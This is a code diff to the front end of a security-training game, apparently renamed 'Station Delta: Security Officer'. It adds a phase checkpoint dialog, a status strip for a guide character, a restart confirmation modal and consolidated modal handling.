+  document.getElementById('phase-modal-copy').textContent='Good stopping point. Your progress is already saved, so you can pause here and come back when you are ready.';
+  document.getElementById('phase-modal-next').innerHTML=`Next up: <b>Phase ${G.phase} — ${nextPhase.title}</b>`;
+  openModal('phase-modal');
+}
+function setLolaStrip(tag,msg){
+  const inner=document.getElementById('lola-strip-inner');
+  if(!inner)return;
+  clearInterval(_stripRotateInterval);
+  inner.className='no-scroll';
+  inner.innerHTML=`<span class="lola-strip-msg"><span class="ls-tag">${tag}</span> ${msg}</span>`;
+}
 
 /* ── MODALS ── */
-function openModal(id){document.getElementById(id).classList.add('open');if(id==='ach-modal')renderAch();if(id==='gloss-modal')renderGloss();if(id==='man-modal')renderManModal();}
-function closeModal(id){document.getElementById(id).classList.remove('open')}
+function openModal(id){
+  if(id==='ach-modal')renderAch();
+  if(id==='gloss-modal')renderGloss();
+  if(id==='man-modal')renderManModal();
+  if(id==='career-modal')renderCareer();
+  document.getElementById(id).classList.add('open');
+}
+function closeModal(id){
+  document.getElementById(id).classList.remove('open');
+  restoreTerminalFocus();
+}
 
 /* ── TEACH / JIT / BRIDGE ── */
 function showTeach(tb){
@@ -1369,6 +1652,7 @@ function lolaComment(text){
   w.innerHTML=`L.O.L.A.: <span style="color:var(--cyan)">${text}</span>`;
   $out.appendChild(w);$out.scrollTop=$out.scrollHeight;
   telem('L.O.L.A.: '+text);
+  setLolaStrip('intel',text);
 }
 function lolaMotivate(){
   const lines=[
@@ -1465,7 +1749,7 @@ function renderPlaybook(){
   const sec=document.getElementById('playbook-sec');sec.style.maxHeight='220px';
 }
 function exportPlaybook(){
-  const md=`# My Security Playbook\n*Vibe Security Officer — ${new Date().toLocaleDateString()}*\n\n`+
+  const md=`# My Security Playbook\n*Station Delta: Security Officer — ${new Date().toLocaleDateString()}*\n\n`+
     G.playbook.map(e=>`## ${e.phase}\n${e.note}`).join('\n\n');
   const ta=document.createElement('textarea');ta.value=md;ta.style.position='fixed';ta.style.opacity='0';
   document.body.appendChild(ta);ta.select();document.execCommand('copy');document.body.removeChild(ta);
@@ -1525,6 +1809,7 @@ function syncObjCard(){
   const totalSteps=PHASES.slice(1).reduce((a,p)=>a+(p?p.steps.length:0),0);
   const doneSteps=PHASES.slice(1,G.phase).reduce((a,p)=>a+(p?p.steps.length:0),0)+G.step;
   document.getElementById('obj-prog-fill').style.width=Math.round(doneSteps/totalSteps*100)+'%';
+  setLolaStrip('objective',`${s.obj} Use <code>${s.cmd?s.cmd[0]:'the command on the card'}</code> when you're ready.`);
 }
 let eaglePhase=true;
 function revealCmd(){
@@ -1617,6 +1902,10 @@ function handleBreakitAnswer(val){
 /* ── PHASE ENGINE ── */
 async function startPhase(){
   const ph=PHASES[G.phase];if(!ph)return;
+  if(G.pendingPhaseStart){
+    G.pendingPhaseStart=false;
+    save();
+  }
   blank();divline();
   appendLine(`PHASE ${G.phase}: ${ph.title.toUpperCase()}`,'ln-success');
   blank();
@@ -1704,19 +1993,14 @@ async function completePhase(ph){
   // WhatIf prompt
   await delay(500);
   showWhatIfButton(G.phase);
-  G.phase++;G.step=0;G.tries=0;G.wrongStreak=0;save();syncDots();
+  G.phase++;G.step=0;G.tries=0;G.wrongStreak=0;G.pendingPhaseStart=true;save();syncDots();
   if(G.phase>9){
     appendLine('All phases complete. Preparing final assessment…','ln-sys');
     await delay(800);startBossFight();
     return;
   }
-  blank();
-  const isLastBeforeBoss=ph.steps[ph.steps.length-1]&&ph.steps[ph.steps.length-1].isFinalBeforeBoss;
-  if(isLastBeforeBoss&&G.phase===9){
-    await delay(300);appendLine('L.O.L.A.: That is the final preparatory phase. One more awaits.','ln-lola');
-    await delay(500);
-  }
-  await startPhase();
+  const nextPh=PHASES[G.phase];
+  openPhaseCheckpoint(ph,nextPh);
 }
 
 /* ── INPUT HANDLER ── */
@@ -1732,8 +2016,18 @@ $cmd.addEventListener('keydown',async e=>{
   appendLine(val,'ln-cmd');
   if(G.achievements.length===0)unlock('first_cmd');
   telem('cmd: '+val);
+  const vl=val.toLowerCase().trim();
   if(G.sandbox){handleSandbox(val);return}
   if(G.bossActive){handleBossInput(val);return}
+  if(G.pendingPhaseStart){
+    if(vl==='man'||vl.startsWith('man ')||vl==='playbook'||vl==='playbook save'||vl==='playbook export'||vl==='whatif'||vl==='deep'||vl==='deep dive'){
+      // allow checkpoint-safe learning surfaces while the next phase is queued
+    } else {
+      appendLine('Checkpoint held. Start the next phase from the checkpoint dialog before progressing.','ln-info');
+      openModal('phase-modal');
+      return;
+    }
+  }
   // Playbook commands (always available)
   if(vl==='playbook save'||vl==='playbook'){savePlaybookEntry();return}
   if(vl==='playbook export'){exportPlaybook();return}
@@ -1753,7 +2047,6 @@ $cmd.addEventListener('keydown',async e=>{
   }
   if(G.activeChallengeData){if(handleChallengeAnswer(val))return}
   if(G.activeBreakitData){if(handleBreakitAnswer(val))return}
-  const vl=val.toLowerCase().trim();
   for(const [key,ee] of Object.entries(EASTER)){if(vl===key||vl.startsWith(key+' ')){ee.handle(val);return}}
   if(vl==='man'){showManAll();return}
   if(vl.startsWith('man ')){const k=vl.slice(4).trim();if(!showManPage(k))appendLine(`man: no entry for '${k}'`,'ln-err');return}
@@ -1906,7 +2199,7 @@ async function completeBossFight(){
   for(const s of steps){await delay(220);appendLine('  '+s,'ln-code')}
   await delay(500);blank();
   appendLine('🔐 SECURITY CERTIFICATION GRANTED','ln-success');
-  appendLine(`Officer ${G.name} — Vibe Security Officer · Class of 2026`,'ln-success');
+  appendLine(`Officer ${G.name} — Station Delta: Security Officer · Class of 2026`,'ln-success');
   blank();
   appendLine('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━','ln-success');
   appendLine('      SECURITY CERTIFICATION COMPLETE','ln-success');
@@ -1952,6 +2245,7 @@ function startAcademy(){
   const n=document.getElementById('boot-name').value.trim();G.name=n||'Officer';
   document.getElementById('cadet-name-display').textContent=G.name;
   if(G.hard)document.getElementById('hardmode-pill').style.display='inline';
+  applyUIPreferences();
   closeModal('boot-modal');save();telem('Session: '+G.name+' ['+G.learnerPath.toUpperCase()+']');
   bootTerminal();
 }
@@ -1961,7 +2255,7 @@ window.addEventListener('load',()=>{setTimeout(()=>{const bi=document.getElement
 function bootTerminal(){
   const pathLabel={explorer:'GUIDED MODE',practitioner:'PRACTITIONER MODE',expert:'EXPERT MODE'};
   const lines=[
-    {t:'VIBE SECURITY OFFICER v1.0 — SECURITY EDITION',c:'ln-success'},
+    {t:'STATION DELTA: SECURITY OFFICER v1.0',c:'ln-success'},
     {t:'Booting security operations center…',c:'ln-sys'},
     {t:'Perimeter defense systems: READY',c:'ln-sys'},
     {t:'Injection scanner: READY',c:'ln-sys'},
@@ -1996,6 +2290,7 @@ function resumeSession(){
   if(G.hard)document.getElementById('hardmode-pill').style.display='inline';
   if(G.sandbox)document.getElementById('sandbox-pill').style.display='inline';
   if(G.careerLog.length>0)document.getElementById('career-impact-btn').style.display='inline';
+  applyUIPreferences();
   if(G.completedPhases.includes(5))addAgent('Vuln Analyst','Cipher');
   if(G.completedPhases.includes(6))addAgent('Pen Tester','Raven');
   if(G.completedPhases.includes(7))addAgent('Threat Analyst','Specter');
@@ -2007,6 +2302,11 @@ function resumeSession(){
   }else if(G.bossActive){
     appendLine('Active incident in progress. J.A.N.E.T. is still waiting.','ln-warn');
     blank();showBossStep(G.bossStep);
+  }else if(G.pendingPhaseStart){
+    const ph=PHASES[G.phase];
+    appendLine(`Checkpoint reached. Resume when you're ready for Phase ${G.phase}: ${ph.title}.`,'ln-info');
+    setLola('Checkpoint held. Your next phase is queued, but training is paused until you explicitly resume it.');
+    openPhaseCheckpoint(PHASES[G.phase-1],ph);
   }else{
     const ph=PHASES[G.phase];const s=ph&&ph.steps[G.step];
     if(ph&&s){
@@ -2019,26 +2319,18 @@ function resumeSession(){
   syncDots();syncObjCard();$cmd.focus();
 }
 
-function doRestart(){if(confirm('Restart Vibe Security Officer from scratch?')){localStorage.removeItem(SAVE_KEY);location.reload()}}
+function doRestart(){openModal('restart-modal')}
+function confirmRestart(){closeModal('restart-modal');localStorage.removeItem(SAVE_KEY);location.reload()}
 function shareGrad(){
-  const txt=`Just completed Vibe Security Officer 🔐\n\nAll 9 phases: perimeter defense, injection attacks, auth hardening, secrets management, DDoS defense, AI vulnerability scanning, threat modeling, incident response, and zero-trust architecture.\n\nAnd a boss fight administered by a passive-aggressive AI.\n\nFree training →`;
+  const txt=`Just completed Station Delta: Security Officer 🔐\n\nAll 9 phases: perimeter defense, injection attacks, auth hardening, secrets management, DDoS defense, AI vulnerability scanning, threat modeling, incident response, and zero-trust architecture.\n\nAnd a boss fight administered by a passive-aggressive AI.\n\nFree training →`;
   window.open('https://x.com/intent/tweet?text='+encodeURIComponent(txt),'_blank');closeModal('grad-modal');
 }
 
-/* ── CAREER MODAL ── */
-document.getElementById('career-modal').addEventListener('click',function(e){if(e.target===this)closeModal('career-modal')});
-document.getElementById('ach-modal').addEventListener('click',function(e){if(e.target===this)closeModal('ach-modal')});
-document.getElementById('gloss-modal').addEventListener('click',function(e){if(e.target===this)closeModal('gloss-modal')});
-document.getElementById('man-modal').addEventListener('click',function(e){if(e.target===this)closeModal('man-modal')});
-document.getElementById('boot-modal').addEventListener('click',function(e){});
-
-// Override renderCareer to use the right function
-document.getElementById('career-modal').addEventListener('transitionend',()=>{});
-const _origOpen=openModal;
-window.openModal=function(id){
-  _origOpen(id);
-  if(id==='career-modal')renderCareer();
-};
+document.querySelectorAll('.modal').forEach(m=>m.addEventListener('click',e=>{
+  if(e.target===m && m.id!=='boot-modal'){
+    closeModal(m.id);
+  }
+}));
 
 /* ── STARTUP ── */
 loadSave();
@@ -2051,6 +2343,7 @@ if(G.name!=='Officer'&&(G.phase>1||G.completedPhases.length>0)){
 }else{
   setTimeout(()=>document.getElementById('boot-name').focus(),300);
 }
+applyUIPreferences();
 </script>
 </body>
 </html>
